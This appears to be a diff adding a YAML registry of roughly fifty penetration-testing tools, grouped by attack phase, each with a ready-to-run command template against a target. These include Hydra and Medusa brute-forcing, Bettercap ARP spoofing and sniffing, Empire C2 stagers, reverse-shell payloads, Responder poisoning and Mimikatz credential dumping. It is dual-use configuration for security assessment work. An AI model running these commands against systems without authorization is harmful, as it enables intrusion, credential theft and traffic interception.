@@ -1,0 +1,630 @@
+categories:
+  recon:
+    label: "Reconnaissance"
+    phase_order: 1
+    color: "#3B82F6"
+    description: "Passive and active information gathering"
+  web_app:
+    label: "Web Application Testing"
+    phase_order: 2
+    color: "#8B5CF6"
+    description: "Web-specific vulnerability discovery"
+  vuln_scan:
+    label: "Vulnerability Scanning"
+    phase_order: 3
+    color: "#F59E0B"
+    description: "Automated vulnerability detection"
+  exploitation:
+    label: "Exploitation"
+    phase_order: 4
+    color: "#EF4444"
+    description: "Gaining access via identified vulnerabilities"
+  password:
+    label: "Password Attacks"
+    phase_order: 5
+    color: "#EC4899"
+    description: "Credential cracking and brute force"
+  post_exploit:
+    label: "Post-Exploitation"
+    phase_order: 6
+    color: "#14B8A6"
+    description: "Lateral movement and privilege escalation"
+  wireless:
+    label: "Wireless Testing"
+    phase_order: 7
+    color: "#F97316"
+    description: "Wireless network security assessment"
+  forensics:
+    label: "Forensics & Reporting"
+    phase_order: 8
+    color: "#6366F1"
+    description: "Evidence analysis and documentation"
+
+tools:
+  # ============================================================
+  # RECONNAISSANCE (Phase 1)
+  # ============================================================
+  - name: nmap
+    phase: recon
+    description: "Network discovery, port scanning, and service version detection"
+    keywords: [nmap, port, scan, network, service, discovery, open ports, fingerprint]
+    command: "nmap {args} {target} 2>/dev/null"
+    args: "-sV -sC -T4"
+    check: "nmap --version"
+    timeout: 600
+    output_parser: nmap
+    priority: 1
+    use_cases: ["Discover open ports and running services", "OS fingerprinting", "Service version detection", "Network inventory"]
+
+  - name: subfinder
+    phase: recon
+    description: "Passive subdomain enumeration using multiple OSINT sources"
+    keywords: [subfinder, subdomain, passive, osint, enumerate domains]
+    command: "subfinder -d {target} -silent 2>/dev/null"
+    check: "subfinder --version"
+    timeout: 180
+    output_parser: text_lines
+    priority: 1
+    use_cases: ["Discover subdomains passively", "DNS enumeration", "Asset discovery"]
+
+  - name: amass
+    phase: recon
+    description: "In-depth DNS enumeration, network mapping, and OSINT integration"
+    keywords: [amass, dns, intel, enum, mapping, subdomain]
+    command: "amass enum -passive -d {target} 2>/dev/null"
+    check: "amass --version"
+    timeout: 600
+    output_parser: text_lines
+    priority: 2
+    use_cases: ["Deep subdomain enumeration", "DNS mapping", "ASN discovery", "Certificate transparency"]
+
+  - name: theHarvester
+    phase: recon
+    description: "Email, subdomain, and employee name harvesting from public sources"
+    keywords: [theharvester, email, harvest, osint, employee, people]
+    command: "theHarvester -d {target} -b all -f /tmp/harvester_{target}.html 2>/dev/null"
+    check: "theHarvester --version"
+    timeout: 300
+    output_parser: theharvester
+    priority: 2
+    use_cases: ["Email address discovery", "Employee name enumeration", "Subdomain discovery via search engines"]
+
+  - name: recon-ng
+    phase: recon
+    description: "Full-featured reconnaissance framework with modular workflows"
+    keywords: [recon-ng, reconng, framework, osint, recon]
+    command: "echo 'use recon/domains-hosts/google_site_web\nset source {target}\nrun\nexit' | recon-ng -r /dev/stdin 2>/dev/null"
+    check: "recon-ng --version"
+    timeout: 300
+    output_parser: text_lines
+    priority: 3
+    use_cases: ["Automated reconnaissance workflows", "Multi-source OSINT gathering", "Reporting and export"]
+
+  - name: spiderfoot
+    phase: recon
+    description: "OSINT automation tool for surface, deep, and dark web intelligence"
+    keywords: [spiderfoot, osint, intelligence, footprint, scan]
+    command: "spiderfoot -s {target} -o /tmp/spiderfoot_{target}.json 2>/dev/null"
+    check: "which spiderfoot"
+    timeout: 600
+    output_parser: json_file
+    priority: 3
+    use_cases: ["Comprehensive OSINT gathering", "Footprinting", "Threat intelligence collection"]
+
+  - name: shodan
+    phase: recon
+    description: "Internet-connected device search engine and banner grabbing"
+    keywords: [shodan, banner, device, iot, internet scan, host]
+    command: "shodan host {target} 2>/dev/null || shodan search {target} 2>/dev/null"
+    check: "shodan --version"
+    timeout: 60
+    output_parser: text_lines
+    priority: 3
+    use_cases: ["Internet-facing asset discovery", "Banner grabbing", "Vulnerable device identification"]
+
+  - name: dnsrecon
+    phase: recon
+    description: "DNS enumeration, zone transfers, and SRV record discovery"
+    keywords: [dnsrecon, dns, zone transfer, record, srv, mx, txt]
+    command: "dnsrecon -d {target} -t std 2>/dev/null"
+    check: "which dnsrecon"
+    timeout: 120
+    output_parser: text_lines
+    priority: 2
+    use_cases: ["DNS record enumeration", "Zone transfer testing", "SRV record discovery"]
+
+  - name: aort
+    phase: recon
+    description: "All-in-one recon tool combining multiple enumeration techniques"
+    keywords: [aort, recon, all in one, enumeration, subdomain]
+    command: "aort -d {target} 2>/dev/null"
+    check: "which aort"
+    timeout: 300
+    output_parser: text_lines
+    priority: 3
+    use_cases: ["Comprehensive all-in-one recon", "Subdomain + email + port enumeration"]
+
+  # ============================================================
+  # WEB APPLICATION TESTING (Phase 2)
+  # ============================================================
+  - name: gobuster
+    phase: web_app
+    description: "Directory/file brute-forcing and DNS subdomain discovery"
+    keywords: [gobuster, directory, brute force, dir, path, discovery]
+    command: "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -q 2>/dev/null"
+    check: "gobuster --version"
+    timeout: 300
+    output_parser: gobuster
+    priority: 1
+    use_cases: ["Directory and file brute-forcing", "Hidden resource discovery", "Content enumeration"]
+
+  - name: ffuf
+    phase: web_app
+    description: "Fast web fuzzer for directory, parameter, and value discovery"
+    keywords: [ffuf, fuzz, fuzzing, parameter, directory, discovery]
+    command: "ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac -o /tmp/ffuf_{target}.json 2>/dev/null"
+    check: "which ffuf"
+    timeout: 300
+    output_parser: json_file
+    priority: 1
+    use_cases: ["Web fuzzing and discovery", "Parameter fuzzing", "Virtual host discovery", "Content discovery"]
+
+  - name: dirb
+    phase: web_app
+    description: "Web content scanner for hidden directories and files"
+    keywords: [dirb, directory, scanner, web, path, discovery]
+    command: "dirb {target} /usr/share/wordlists/dirb/common.txt -o /tmp/dirb_{target}.txt 2>/dev/null"
+    check: "which dirb"
+    timeout: 300
+    output_parser: dirb
+    priority: 2
+    use_cases: ["Web directory brute-forcing", "Hidden file discovery"]
+
+  - name: sqlmap
+    phase: web_app
+    description: "Automated SQL injection detection and exploitation"
+    keywords: [sqlmap, sql, injection, sqli, database, dump]
+    command: "sqlmap -u {target} --batch --random-agent --output-dir=/tmp/sqlmap_{target} 2>/dev/null"
+    check: "sqlmap --version"
+    timeout: 600
+    output_parser: sqlmap
+    priority: 1
+    use_cases: ["SQL injection detection", "Database fingerprinting", "Data exfiltration", "SQLi exploitation"]
+
+  - name: wpscan
+    phase: web_app
+    description: "WordPress security scanner for theme/plugin/user enumeration"
+    keywords: [wpscan, wordpress, wp, plugin, theme, user, vulnerability]
+    command: "wpscan --url {target} --no-update --output /tmp/wpscan_{target}.json 2>/dev/null"
+    check: "wpscan --version"
+    timeout: 300
+    output_parser: json_file
+    priority: 1
+    use_cases: ["WordPress vulnerability scanning", "Plugin and theme enumeration", "User enumeration", "Weak password detection"]
+
+  - name: xsstrike
+    phase: web_app
+    description: "Advanced XSS detection and exploitation scanner"
+    keywords: [xsstrike, xss, cross-site scripting, injection, payload]
+    command: "xsstrike -u {target} --crawl --output /tmp/xsstrike_{target}.txt 2>/dev/null"
+    check: "which xsstrike"
+    timeout: 300
+    output_parser: text_lines
+    priority: 2
+    use_cases: ["XSS vulnerability detection", "Reflected/stored/DOM XSS scanning", "WAF bypass testing"]
+
+  - name: burpsuite
+    phase: web_app
+    description: "Web application security testing platform with proxy, scanner, and repeater"
+    keywords: [burp, burpsuite, proxy, intercept, web scan, repeater]
+    command: "burpsuite --use-defaults --project-file=/tmp/{target}.burp 2>/dev/null & sleep 5 && echo 'Burp Suite started'"
+    check: "which burpsuite"
+    timeout: 1800
+    output_parser: raw
+    priority: 3
+    use_cases: ["Web application penetration testing", "Traffic interception and analysis", "Automated web scanning", "Session manipulation"]
+    install_hint: "Download from https://portswigger.net/burp"
+
+  - name: owasp_zap
+    phase: web_app
+    description: "OWASP Zed Attack Proxy — open-source web app security scanner"
+    keywords: [zap, owasp, proxy, web scan, spider, active scan]
+    command: "zap-cli quick-scan --self-contained -o /tmp/zap_{target}.html {target} 2>/dev/null"
+    check: "which zap-cli || which zaproxy"
+    timeout: 600
+    output_parser: raw
+    priority: 3
+    use_cases: ["Automated web vulnerability scanning", "Passive and active scanning", "Spider crawling", "API scanning"]
+
+  # ============================================================
+  # VULNERABILITY SCANNING (Phase 3)
+  # ============================================================
+  - name: nikto
+    phase: vuln_scan
+    description: "Web server scanner for dangerous files, CGIs, and misconfigurations"
+    keywords: [nikto, web server, scan, vulnerability, cgi, misconfiguration]
+    command: "nikto -h {target} -Format txt -output /tmp/nikto_{target}.txt 2>/dev/null"
+    check: "which nikto"
+    timeout: 600
+    output_parser: nikto
+    priority: 1
+    use_cases: ["Web server vulnerability scanning", "Configuration audit", "Dangerous file discovery"]
+
+  - name: searchsploit
+    phase: vuln_scan
+    description: "Exploit Database search tool for finding public exploits and PoCs"
+    keywords: [searchsploit, exploit, cve, edb, vulnerability search, poc]
+    command: "searchsploit {target} --json 2>/dev/null"
+    check: "which searchsploit"
+    timeout: 60
+    output_parser: searchsploit
+    priority: 1
+    use_cases: ["CVE to exploit mapping", "Finding public exploits", "Vulnerability research"]
+
+  - name: nessus
+    phase: vuln_scan
+    description: "Industry-standard vulnerability scanner with comprehensive plugin database"
+    keywords: [nessus, vulnerability, scan, cve, compliance, audit]
+    command: "/opt/nessus/sbin/nessuscli scan --target {target} 2>/dev/null || echo 'Nessus CLI not available in this environment'"
+    check: "/opt/nessus/sbin/nessuscli --version 2>/dev/null || which nessus"
+    timeout: 1800
+    output_parser: raw
+    priority: 2
+    use_cases: ["Full vulnerability assessment", "Compliance scanning", "Configuration audit"]
+    install_hint: "Download from https://www.tenable.com/downloads/nessus"
+
+  - name: openvas
+    phase: vuln_scan
+    description: "Open Vulnerability Assessment System — full-featured vulnerability scanner"
+    keywords: [openvas, gvm, vulnerability, scan, greenbone, omp]
+    command: "omp --host {target} --username=admin --password=admin --xml='<create_task><name>scan_{target}</name><target>{target}</target></create_task>' 2>/dev/null || gvmcli --scan {target} 2>/dev/null || echo 'OpenVAS not available'"
+    check: "which omp || which gvmcli || which gvmd"
+    timeout: 1800
+    output_parser: raw
+    priority: 2
+    use_cases: ["Automated vulnerability scanning", "Network vulnerability assessment", "CVE-based reporting"]
+    install_hint: "Install via: apt install openvas && gvm-setup"
+
+  # ============================================================
+  # EXPLOITATION (Phase 4)
+  # ============================================================
+  - name: metasploit
+    phase: exploitation
+    description: "Metasploit Framework — exploit development and execution platform"
+    keywords: [metasploit, msf, exploit, payload, meterpreter, module]
+    command: "msfconsole -q -x 'search {target}; exit' 2>/dev/null"
+    check: "msfconsole --version 2>/dev/null || which msfconsole"
+    timeout: 900
+    output_parser: text_lines
+    priority: 1
+    use_cases: ["Exploit development and execution", "Payload generation", "Post-exploitation modules", "Vulnerability validation"]
+
+  - name: cobalt_strike
+    phase: exploitation
+    description: "Commercial adversary simulation and threat emulation platform"
+    keywords: [cobalt strike, beacon, c2, adversary simulation, threat emulation]
+    command: "echo 'Cobalt Strike requires licensed installation — manual setup required' > /tmp/cobalt_strike_{target}.txt"
+    check: "which teamserver 2>/dev/null || ls /opt/cobaltstrike/teamserver 2>/dev/null || echo 'not_installed'"
+    timeout: 60
+    output_parser: raw
+    priority: 3
+    use_cases: ["Adversary simulation", "Red team operations", "Command and control", "Post-exploitation"]
+    install_hint: "Download from https://www.cobaltstrike.com — place in /opt/cobaltstrike/"
+
+  - name: beef
+    phase: exploitation
+    description: "Browser Exploitation Framework for client-side attacks"
+    keywords: [beef, browser, hook, client-side, xss, hooking]
+    command: "cd /usr/share/beef-xss && ./beef -x 2>/dev/null & sleep 5 && echo 'BeEF started on port 3000'"
+    check: "ls /usr/share/beef-xss/beef 2>/dev/null || which beef-xss"
+    timeout: 120
+    output_parser: raw
+    priority: 2
+    use_cases: ["Browser-based exploitation", "Client-side attack simulation", "Phishing campaign support"]
+
+  - name: set
+    phase: exploitation
+    description: "Social-Engineer Toolkit — advanced social engineering attacks"
+    keywords: [set, social engineer, phishing, spear phishing, credential harvest, website clone]
+    command: "set-automate --target {target} --payload windows/meterpreter/reverse_tcp 2>/dev/null || echo 'SET requires interactive mode — use setoolkit directly'"
+    check: "which setoolkit"
+    timeout: 300
+    output_parser: raw
+    priority: 2
+    use_cases: ["Social engineering campaigns", "Phishing simulation", "Credential harvesting", "Website cloning"]
+
+  - name: empire
+    phase: exploitation
+    description: "PowerShell Empire — post-exploitation and command & control framework"
+    keywords: [empire, powershell, c2, agent, listener, post-exploitation]
+    command: "empire --headless -s 'uselistener http; set Host {target}; execute; back; usestager windows/launcher_bat; set Listener http; execute; exit' 2>/dev/null || echo 'Empire not available'"
+    check: "which empire || which powershell-empire"
+    timeout: 120
+    output_parser: raw
+    priority: 2
+    use_cases: ["Post-exploitation C2", "PowerShell-based attacks", "Agent management", "Credential theft"]
+
+  - name: exploitpack
+    phase: exploitation
+    description: "Collection of pre-compiled exploits for rapid testing"
+    keywords: [exploitpack, exploit, poc, proof of concept, compiled exploit]
+    command: "java -jar /opt/exploitpack/ExploitPack.jar --target {target} 2>/dev/null || echo 'ExploitPack requires Java and manual setup'"
+    check: "ls /opt/exploitpack/ExploitPack.jar 2>/dev/null"
+    timeout: 300
+    output_parser: raw
+    priority: 3
+    use_cases: ["Pre-compiled exploit execution", "Rapid PoC testing", "Vulnerability validation"]
+    install_hint: "Download from https://exploitpack.com — place in /opt/exploitpack/"
+
+  - name: routersploit
+    phase: exploitation
+    description: "Embedded device exploitation framework for routers and IoT"
+    keywords: [routersploit, router, iot, embedded, exploit, firmware]
+    command: "routersploit --target {target} --exploit 2>/dev/null || echo 'Use rsf.py interactively'"
+    check: "which rsf.py || which routersploit"
+    timeout: 300
+    output_parser: raw
+    priority: 2
+    use_cases: ["Router and IoT exploitation", "Embedded device testing", "Firmware vulnerability checking"]
+
+  # ============================================================
+  # PASSWORD ATTACKS (Phase 5)
+  # ============================================================
+  - name: john
+    phase: password
+    description: "John the Ripper — fast password cracking tool"
+    keywords: [john, crack, password, hash, bruteforce, johnny]
+    command: "john --wordlist=/usr/share/wordlists/rockyou.txt {target} 2>/dev/null || echo 'Provide hash file as target'"
+    check: "john --version"
+    timeout: 600
+    output_parser: john
+    priority: 1
+    use_cases: ["Password hash cracking", "Dictionary attacks", "Incremental brute force", "Hash identification"]
+
+  - name: hashcat
+    phase: password
+    description: "World's fastest password recovery tool with GPU acceleration"
+    keywords: [hashcat, hash, crack, gpu, bruteforce, mask attack]
+    command: "hashcat -m 0 -a 0 {target} /usr/share/wordlists/rockyou.txt --force 2>/dev/null || echo 'Use: hashcat -m <hash_type> -a 0 <hashfile> wordlist'"
+    check: "hashcat --version"
+    timeout: 600
+    output_parser: hashcat
+    priority: 1
+    use_cases: ["High-speed hash cracking", "GPU-accelerated attacks", "Mask and rule-based attacks", "Benchmarking"]
+
+  - name: hydra
+    phase: password
+    description: "Parallelized network login brute-forcing tool"
+    keywords: [hydra, brute force, login, password, authentication, ssh, ftp, rdp]
+    command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} -t 4 2>/dev/null || hydra -L /usr/share/wordlists/dirb/common.txt -P /usr/share/wordlists/rockyou.txt {target} 2>/dev/null"
+    check: "hydra --version"
+    timeout: 600
+    output_parser: hydra
+    priority: 1
+    use_cases: ["Online brute-force attacks", "Service credential testing", "SSH/FTP/HTTP/RDP password audit"]
+
+  - name: medusa
+    phase: password
+    description: "Parallel network login brute-forcer with modular design"
+    keywords: [medusa, brute force, login, parallel, authentication]
+    command: "medusa -h {target} -u admin -P /usr/share/wordlists/rockyou.txt -M http 2>/dev/null || medusa -h {target} -U /usr/share/wordlists/dirb/common.txt -P /usr/share/wordlists/rockyou.txt -M ssh 2>/dev/null"
+    check: "medusa --version"
+    timeout: 300
+    output_parser: medusa
+    priority: 2
+    use_cases: ["Parallel brute-force attacks", "Multi-protocol authentication testing"]
+
+  - name: mimikatz
+    phase: password
+    description: "Windows credential extraction and pass-the-hash toolkit"
+    keywords: [mimikatz, windows, credential, lsass, pass-the-hash, kerberos, ticket]
+    command: "echo 'Mimikatz runs on Windows targets — use via: mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"' > /tmp/mimikatz_{target}.txt"
+    check: "which mimikatz || which mimikatz.exe 2>/dev/null || echo 'windows_only'"
+    timeout: 30
+    output_parser: raw
+    priority: 2
+    use_cases: ["Windows credential extraction", "Pass-the-hash attacks", "Kerberos ticket manipulation", "LSASS dump"]
+    install_hint: "Download from https://github.com/gentilkiwi/mimikatz — runs on Windows only"
+
+  # ============================================================
+  # POST-EXPLOITATION (Phase 6)
+  # ============================================================
+  - name: responder
+    phase: post_exploit
+    description: "LLMNR/NBT-NS/mDNS poisoner for credential interception"
+    keywords: [responder, llmnr, nbt-ns, mdns, poisoning, hash capture, smb]
+    command: "responder -I eth0 -rdw -v 2>/dev/null & sleep 3 && echo 'Responder running on eth0 — check /usr/share/responder/logs/'"
+    check: "which responder"
+    timeout: 300
+    output_parser: raw
+    priority: 1
+    use_cases: ["LLMNR/NBT-NS poisoning", "Credential hash capturing", "SMB relay preparation"]
+
+  - name: crackmapexec
+    phase: post_exploit
+    description: "Swiss Army knife for post-exploitation Windows/Active Directory assessment"
+    keywords: [crackmapexec, cme, smb, winrm, active directory, lateral, enum]
+    command: "crackmapexec smb {target} 2>/dev/null"
+    check: "which crackmapexec || which cme"
+    timeout: 120
+    output_parser: text_lines
+    priority: 1
+    use_cases: ["SMB enumeration", "Active Directory assessment", "Credential validation", "Lateral movement"]
+
+  - name: bloodhound
+    phase: post_exploit
+    description: "Active Directory attack path mapping and visualization"
+    keywords: [bloodhound, active directory, ad, sharphound, attack path, privilege escalation]
+    command: "bloodhound-python -d {target} -c All --dns-timeout 10 --no-pass 2>/dev/null || echo 'Requires domain credentials: bloodhound-python -d DOMAIN -u USER -p PASS -c All'"
+    check: "which bloodhound-python"
+    timeout: 300
+    output_parser: json_file
+    priority: 1
+    use_cases: ["Active Directory attack path analysis", "Privilege escalation path mapping", "Group policy analysis"]
+
+  - name: evil_winrm
+    phase: post_exploit
+    description: "WinRM shell for Windows remote management and post-exploitation"
+    keywords: [evil-winrm, winrm, windows, remote, shell, ps, powershell]
+    command: "evil-winrm -i {target} -u Administrator -p 'Password123!' -s /usr/share/evil-winrm/ 2>/dev/null || evil-winrm -i {target} -u Administrator -H <NTLM_HASH> 2>/dev/null"
+    check: "which evil-winrm"
+    timeout: 60
+    output_parser: raw
+    priority: 2
+    use_cases: ["Windows remote shell access", "Post-exploitation command execution", "PowerShell remoting"]
+
+  - name: chisel
+    phase: post_exploit
+    description: "Fast TCP/UDP tunnel over HTTP for network pivoting"
+    keywords: [chisel, tunnel, proxy, pivot, socks, reverse tunnel]
+    command: "chisel server --port 8080 --socks5 2>/dev/null & sleep 2 && chisel client {target}:8080 socks 2>/dev/null"
+    check: "which chisel"
+    timeout: 120
+    output_parser: raw
+    priority: 2
+    use_cases: ["Network pivoting", "Tunneling through firewalls", "SOCKS proxy setup", "Port forwarding"]
+
+  - name: ligolo_ng
+    phase: post_exploit
+    description: "Lightweight tunneling/pivoting tool using TUN interfaces"
+    keywords: [ligolo, tunnel, pivot, tun, proxy, network, bypass]
+    command: "ligolo-ng -selfcert -laddr 0.0.0.0:4443 2>/dev/null & sleep 2 && echo 'Ligolo-ng agent waiting on :4443'"
+    check: "which ligolo-ng || which ligolo-agent || which ligolo-proxy"
+    timeout: 120
+    output_parser: raw
+    priority: 3
+    use_cases: ["Network pivoting", "Traffic tunneling", "Multi-hop proxy chains", "Covert channel setup"]
+
+  - name: snaffler
+    phase: post_exploit
+    description: "Active Directory file share content discovery and sensitive data finder"
+    keywords: [snaffler, share, file, sensitive, data, discovery, ad, smb]
+    command: "echo 'Snaffler runs on Windows: snaffler.exe -s {target} -o snaffler_{target}.log' > /tmp/snaffler_{target}.txt"
+    check: "which snaffler || ls /opt/snaffler/Snaffler.exe 2>/dev/null || echo 'windows_only'"
+    timeout: 30
+    output_parser: raw
+    priority: 3
+    use_cases: ["Sensitive data discovery on network shares", "Active Directory file auditing", "Password/secret discovery"]
+    install_hint: "Download from https://github.com/SnaffCon/Snaffler — runs on Windows"
+
+  # ============================================================
+  # WIRELESS TESTING (Phase 7)
+  # ============================================================
+  - name: aircrack_ng
+    phase: wireless
+    description: "Complete suite for wireless network security assessment and WEP/WPA cracking"
+    keywords: [aircrack, wifi, wireless, wpa, wep, handshake, packet]
+    command: "aircrack-ng -w /usr/share/wordlists/rockyou.txt {target} 2>/dev/null || echo 'Usage: airmon-ng start <interface>; airodump-ng <interface>; aircrack-ng <capture>'"
+    check: "aircrack-ng --version || airmon-ng --version"
+    timeout: 600
+    output_parser: text_lines
+    priority: 1
+    use_cases: ["WEP/WPA key cracking", "Wireless packet capture and analysis", "Handshake capture"]
+
+  - name: kismet
+    phase: wireless
+    description: "Wireless network detector, sniffer, and intrusion detection system"
+    keywords: [kismet, wifi, wireless, detect, sniff, monitor, ids]
+    command: "kismet -c wlan0mon --no-gps --override wardrive --outdir /tmp/kismet_{target} 2>/dev/null & sleep 5 && echo 'Kismet started'"
+    check: "which kismet"
+    timeout: 300
+    output_parser: raw
+    priority: 2
+    use_cases: ["Wireless network discovery", "Packet sniffing", "WIDS monitoring", "Wardriving"]
+
+  - name: wifite2
+    phase: wireless
+    description: "Automated wireless attack tool for auditing WPA/WEP networks"
+    keywords: [wifite, wifi, automated, wpa, handshake, wps, pixie]
+    command: "wifite --target {target} --dict /usr/share/wordlists/rockyou.txt --kill --mac 2>/dev/null"
+    check: "which wifite || which wifite2"
+    timeout: 300
+    output_parser: text_lines
+    priority: 1
+    use_cases: ["Automated wireless auditing", "WPA handshake capture", "WPS PIN attack", "PMKID attack"]
+
+  - name: bettercap
+    phase: wireless
+    description: "Swiss Army knife for network attacks and monitoring"
+    keywords: [bettercap, mitm, spoof, arp, dns, http, https, capture]
+    command: "bettercap -eval 'set arp.spoof.targets {target}; arp.spoof on; http.proxy on; net.sniff on' 2>/dev/null"
+    check: "which bettercap"
+    timeout: 300
+    output_parser: raw
+    priority: 2
+    use_cases: ["MITM attacks", "ARP/DNS spoofing", "Traffic sniffing", "Credential capture", "Network monitoring"]
+
+  # ============================================================
+  # FORENSICS & REPORTING (Phase 8)
+  # ============================================================
+  - name: autopsy
+    phase: forensics
+    description: "Digital forensics platform for disk image analysis"
+    keywords: [autopsy, forensics, disk, image, sleuth, analysis, evidence]
+    command: "autopsy --port 9999 --no-browser 2>/dev/null & sleep 3 && echo 'Autopsy web interface on http://localhost:9999'"
+    check: "which autopsy || which autopsy-gui"
+    timeout: 60
+    output_parser: raw
+    priority: 3
+    use_cases: ["Disk forensics", "File recovery analysis", "Timeline creation", "Evidence examination"]
+    install_hint: "Install via: apt install autopsy"
+
+  - name: volatility
+    phase: forensics
+    description: "Advanced memory forensics framework for RAM dump analysis"
+    keywords: [volatility, memory, forensics, ram, dump, process, volatility3]
+    command: "vol -f {target} windows.info 2>/dev/null || vol3 -f {target} windows.info 2>/dev/null || echo 'Usage: vol -f <memory_dump> <plugin>'"
+    check: "which vol || which vol3 || which volatility"
+    timeout: 300
+    output_parser: text_lines
+    priority: 2
+    use_cases: ["Memory forensics", "RAM dump analysis", "Process listing", "Network connection extraction", "Malware analysis"]
+
+  - name: dradis
+    phase: forensics
+    description: "Collaborative reporting and evidence management platform"
+    keywords: [dradis, report, collaboration, evidence, findings, methodology]
+    command: "dradis-ce start --no-browser 2>/dev/null & sleep 5 && echo 'Dradis CE started on http://localhost:3000'"
+    check: "which dradis-ce || ls /opt/dradis-ce/ 2>/dev/null"
+    timeout: 60
+    output_parser: raw
+    priority: 3
+    use_cases: ["Penetration testing reporting", "Evidence management", "Team collaboration", "Methodology templates"]
+    install_hint: "Install via: gem install dradis-ce"
+
+  - name: cherrytree
+    phase: forensics
+    description: "Hierarchical note-taking and documentation tool for security assessments"
+    keywords: [cherrytree, notes, documentation, reporting, hierarchical, organizer]
+    command: "cherrytree {target}.ctb 2>/dev/null || echo 'CherryTree is GUI-only: cherrytree <file>.ctb for interactive use'"
+    check: "which cherrytree"
+    timeout: 30
+    output_parser: raw
+    priority: 3
+    use_cases: ["Penetration testing documentation", "Note organization", "Report generation", "Finding tracking"]
+
+  # ============================================================
+  # CORE / PRIVILEGE ESCALATION
+  # ============================================================
+  - name: unix_privesc_check
+    phase: post_exploit
+    description: "Unix privilege escalation auditing and check script"
+    keywords: [privesc, privilege escalation, linux, unix, sudo, suid, check]
+    command: "unix-privesc-check {target} 2>/dev/null || unix-privesc-check 2>/dev/null"
+    check: "which unix-privesc-check"
+    timeout: 120
+    output_parser: text_lines
+    priority: 2
+    use_cases: ["Linux privilege escalation auditing", "SUID/GUID file checking", "Sudo misconfiguration detection"]
+
+  - name: maltego
+    phase: recon
+    description: "Graphical OSINT and link analysis tool for entity relationship mapping"
+    keywords: [maltego, osint, graph, link analysis, entity, relationship, transform]
+    command: "echo 'Maltego is GUI-based — use Maltego CE for interactive OSINT analysis' > /tmp/maltego_{target}.txt"
+    check: "which maltego || ls /opt/maltego/ 2>/dev/null || echo 'gui_only'"
+    timeout: 30
+    output_parser: raw
+    priority: 4
+    use_cases: ["Entity relationship mapping", "OSINT data correlation", "Visual intelligence analysis"]
+    install_hint: "Download from https://www.maltego.com/downloads/"
